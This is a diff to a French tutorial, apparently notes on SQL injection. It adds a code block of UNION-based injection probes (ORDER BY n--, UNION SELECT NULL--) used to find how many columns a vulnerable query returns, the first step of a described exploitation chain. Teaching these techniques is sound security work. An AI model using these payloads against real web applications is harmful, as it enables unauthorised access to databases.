@@ -44,7 +44,20 @@ Cette requête SQL renvoie un seul ensemble de résultats avec deux colonnes, co
 
   ### La chaîne d'exploitation
 
-  1) Déterminer le nombre de colonnes renvoyés
+  1) Déterminer le nombre de colonnes renvoyés :
+
+```
+'+ORDER+BY+1--
+'+ORDER+BY+2--
+'+ORDER+BY+3--
+etc. -> IF ERROR/OR RESPONSE CHANGE THEN OK
+
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+NULL,NULL,NULL--
+etc. -> IF ERROR/OR RESPONSE CHANGE THEN OK
+```
+
   2) Déterminer les types de données et leurs compatibilités
 
   
